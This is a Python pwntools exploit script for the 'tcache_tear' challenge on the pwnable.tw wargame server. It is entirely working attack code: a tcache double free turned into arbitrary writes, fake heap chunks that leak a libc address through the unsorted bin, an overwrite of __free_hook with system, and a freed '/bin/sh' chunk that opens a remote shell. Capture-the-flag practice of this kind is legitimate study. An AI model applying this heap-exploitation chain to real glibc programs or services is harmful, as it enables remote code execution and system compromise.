from pwn import *

context.terminal = '/bin/sh'

r = remote("chall.pwnable.tw", 10207)


elf = ELF('./tcache_tear')
libc = ELF('./libc.so.6')

def malloc(size, data):
	global malloc_counter
	malloc_counter += 1

	r.recvuntil(' :')
	r.send('1')
	r.recvuntil('Size:')
	r.send(str(size))
	r.recvuntil('Data:')
	r.send(data)
	
	info("[Malloc %d] Allocated chunk [size: %d, data: %s]" % (malloc_counter, size, data))

free_counter = 0
malloc_counter = 0

def free():
	global free_counter
	free_counter += 1
	r.recvuntil(' :')
	r.send('2')
	info("  [Free {n}] Freed last allocated chunk".format(n=free_counter))


def mem_write(address, value, s):
	info("[Mem Write ] Writing %s to %s" % (value, hex(address)))
	malloc(s, "anything")
	free()
	free()
	malloc(s, p64(address))
	malloc(s, p64(address))
	malloc(s, value)

def get_info():
	r.recvuntil(' :')
	r.send('3')
	r.recvuntil(' :')
	return r.recv(0x20)

print(elf.got)
print(elf.symbols)

r.recvuntil('Name:')
r.send('anything')


mem_write(0x602550, 
			p64(0) + 	# Previous Size
			p64(0x21) +	# Chunk Size (A=0, M=0, P=1)
			p64(0) + 	# Forward Pointer
			p64(0) + 	# Backward Pointer
			p64(0) + 	# Empty Space
			p64(0x21),	# Next Previous Size
		0x70)

mem_write(0x602050,
			p64(0) +	# 0x602050		Previous Size 
			p64(0x501) +	# 0x602058		Chunk Size (A=0, M=0, P=1)
			p64(0) +	# 0x602060[name_buffer]	Forward Pointer
			p64(0) +	# 0x602068		Backward Pointer
			p64(0)*3 +	# 0x602070		Empty Space
			p64(0x602060),	# 0x602088[malloced] 	Overwrite the last malloced value
		0x60)

# Next free will be free(0x602060) because we overwrote the last malloced value.

# Note that we need the free to be 0x602060 because free expects the user region of the chunk,
# not the start of the chunk

free()  # free(0x602060)

# This free will overwrite the forward and backward pointer. Since this chunk is the only chunk 
# stored in an unsorted bin, the fwd and bck pointers will point to the location of the bin within
# libc. This location will have a constant offset with libc base.

LEAKED_CHUNK_OFFSET = 0x3ebca0

leaked_chunk_addr = u64(get_info()[:8]) # Leaked address of malloc chunk

LIBC_BASE = leaked_chunk_addr - LEAKED_CHUNK_OFFSET
libc.address = LIBC_BASE

info("Leaked chunk at " + hex(leaked_chunk_addr))
info("Found libc base: " + hex(LIBC_BASE))
info("Found __free_hook address: " + hex(libc.symbols['__free_hook']))

mem_write(libc.symbols['__free_hook'] , p64(libc.symbols['system']), 0x50)
malloc(0x50, "/bin/sh\x00")

free()

r.interactive()